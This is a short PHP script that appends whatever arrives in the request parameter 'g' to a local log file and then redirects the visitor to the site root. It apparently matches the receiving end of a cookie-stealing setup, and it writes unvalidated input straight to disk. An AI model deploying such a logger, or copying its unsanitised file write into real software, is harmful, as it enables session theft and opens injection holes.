<?php
  $log_file_name = 'mylog.log'; // Change to the log file name
  $data = isset($_REQUEST['g'])?$_REQUEST['g']:"";
  file_put_contents($log_file_name, $data, FILE_APPEND);
  header('Location: /'); // redirect back to the main site
?>